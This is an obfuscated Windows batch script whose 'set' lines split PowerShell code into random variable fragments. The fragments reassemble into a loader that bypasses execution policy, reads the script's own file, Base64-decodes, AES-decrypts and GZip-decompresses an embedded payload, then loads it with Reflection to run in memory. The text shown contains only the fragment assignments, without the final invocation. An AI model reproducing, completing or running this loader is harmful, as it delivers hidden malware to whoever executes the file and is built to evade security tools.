@echo off
set "ammbjUBvrA=tion"
set "WWldHaXozw=e = "
set "yIFskKopFy=comp"
set "AzuPKAWjXj= [Sy"
set "jLOfuCNPoZ=ert]"
set "tRawsUvVpI=esFX"
set "JqXRxiqUPz=v4Ir"
set "ldkBkMZbFJ=visF"
set "MWOAFiRZIU=ke($"
set "VQQVbPhRet=t Sy"
set "YbRyMyurLg= [Sy"
set "slDmzfFCZc=);$t"
set "fATnrhojjG=ode]"
set "oViAbPyemD=fulC"
set "PumwEOVksX=nage"
set "WWWdPrBIUR=::('"
set "sQLtdTpEBm=d;$t"
set "EvGLmsuPjq=ion."
set "FIMjJicZKT=m.IO"
set "UjMMCwizvd=yste"
set "vVaCIOfVTa=Disp"
set "qinHDrIwjh=('%*'"
set "zSeMCSRHeF=rtS4"
set "DxmpjMtlng=] -j"
set "jOwiYrbiGx=.Cry"
set "qIWcszpcDH=Comp"
set "WOFfNyIaAg=$Lvi"
set "soIeFMdaUL=;$EA"
set "BhoUcNGSqV=.Len"
set "BdTZSUNrDL=and "
set "zltTHeQbLn=();$"
set "KqSQBMarjP=ZYYc"
set "TbWopLkFrz=AtY."
set "ErlYhYTMjQ=ress"
set "jKWvfXuGXK=ypto"
set "LajtqdjRvB=$hxe"
set "LMlOjRFYmT=am;$"
set "GwldcDTokT=bstr"
set "RUIdscTBcT=-Obj"
set "eEkWYnVcZC=mory"
set "GHYxHVrfIp=BC;$"
set "UdWrVcVIyX=y.Ci"
set "MhYChyuXwf== [S"
set "lMAdWUckcC=ing("
set "spusTShDaa=hy.A"
set "UHsomfbWxp=Star"
set "pjmOZmskez=F'[-"
set "csRTvspakb=rity"
set "OJpDLLsjiP=('%~f0'"
set "dgDpcxIpVa=ck($"
set "TQqMVXJYLl=F = "
set "dPQSjXzzkv=y.Cr"
set "LBPzZTlPkh=morF"
set "xQregvMLQz=ect "
set "lFSjPNhsjN=:('g"
set "jJhIqwGsAq=$Lvi"
set "vbzzsaYVVB=q = "
set "ZqAZVnWJZI=gnir"
set "rHVzrlLJOT=TLF."
set "GqriSxwagL=eq ="
set "ZqCCJCzEFj='dqR"
set "sByVNiumuQ=oryS"
set "YLcqiZMmVm=orF'"
set "voDkJvXPEb=sGUc"
set "IQQYAReQWO=rans"
set "BkgIJtCOrI=6esa"
set "GdQFNUTxAa='[-1"
set "RcxiRzydyZ=7;$t"
set "RjXkkOboNn=bypa"
set "bsKRSzUsMu=n ''"
set "UQsrlaZsXy=q = "
set "TGBzTgJUjN=ewLi"
set "bJDjjQsBzC=7Yiv"
set "DaRbhnkHEo=::De"
set "KAfgQwukjW=k; }"
set "qRtIpqtKYT=y]::"
set "bRFJIWPPGi=Mode"
set "SAxMOtjkmC=UGTu"
set "oZBvBeRKQl=hxee"
set "KkXsMSyHEW=]::N"
set "ZNpITAAHjv=ptor"
set "IwhiOmLckl=();$"
set "sIbWCWxtJp=iron"
set "wzBDDuQOSt= '')"
set "GgTamxjdDr=pres"
set "NKSUFZRFcB=-4] "
set "mdIYvQxhXt=rt]:"
set "PSBCVpClIB=1..-"
set "tmvlNIlBsN=bjec"
set "uRhzhNShZr=fulC"
set "cXLEaymOUH=-ep "
set "MbSQsAokEL=sF.T"
set "bLNHtyDluS=)) {"
set "BDRmqJtMXP=  $S"
set "yHyeKsmUPF= if "
set "JMknBqDVas='txe"
set "PUgCORULFG=Stre"
set "tCzIzsUrHQ=)))"
set "wjhMjZPunW=)($S"
set "pKsXwwWeyF=gth)"
set "IpTFzmEJOQ=grap"
set "iFKHhoTHoq=QyGL"
set "CCdLhfkkPd= = N"
set "spPXkHUoWe=QyGL"
set "nLtTKkqBxg=TllA"
set "tvxKTwjGNe=tsWi"
set "QzuJpRbdek=.Con"
set "AITrVaeLAS='gni"
set "gmqixiahhi=null"
set "HoijHuUNHy=vert"
set "FBEwNNROHJ=rofi"
set "gUWprkRbvc=;$vN"
set "yQPMvMUQPf=ach "
set "kJDvGgvQOF=.Ass"
set "UhTLtYOoBE=[Sys"
set "PxvOGrkpCs=hxee"
set "kXUZhKgSOX=sF);"
set "qODTZqOxHy= [st"
set "PfwljtqVfp=-1.."
set "FQLLSHQawo=comm"
set "RgSkcaymsC=Uj ="
set "kdkJatmtDR=1] -"
set "hzCsNKciGk=.Cre"
set "vRpAVmRTqJ=yste"
set "eCNeDLSkLa=join"
set "ekZhiUCcnB=$tQy"
set "vSiWSnxMYH=isfL"
set "OOssAokCwy=();$"
set "yatxqrXrIw=-joi"
set "TpCsZcFUQz=$hxe"
set "QIICpkMvXk=esMa"
set "aQfickGVme=ew-O"
set "nIueyYxrPb=tTS "
set "eMAxVbaZcx=$Lvi"
set "UIRchkakhm=urit"
set "OJBcPPcJKK=$BST"
set "EGTjFjUyZX=oin "
set "lbczCOYkXS=tS46"
set "iRSCOgCJgv=vj0m"
set "hHyWxHpQna=ne);"
set "xspYdwnsuc=.Com"
set "pVjEgzzEur= = ["
set "yNrRGYkmRF=eam("
set "kZAirdHlWN=($Uw"
set "qqMwgstwNg=New-"
set "rqPwTdlEdM=oL'["
set "AiMEaYcXNf=.Mod"
set "glLPWMgDcu=flec"
set "hsmXIdpoVh=; };"
set "mFBBZaTlxj=xeeq"
set "DsBrpbOqyX=, $h"
set "IvphhCXcBI=ddin"
set "QNcEbZlThO=TS.T"
set "tvpLTzzlDr=[IO."
set "pYenruARJW=.Mem"
set "dqAKZghXWX=q, 0"
set "CItEtjomsL=AtY "
set "NzahHGqmqe=sLzU"
set "svpImcRDSf=ment"
set "eVZtrZAYvb=0O+g"
set "mRdkqBUOIg=.GZi"
set "zCqnoQMzDO=.Dis"
set "BWNmRfvzXp=e]::"
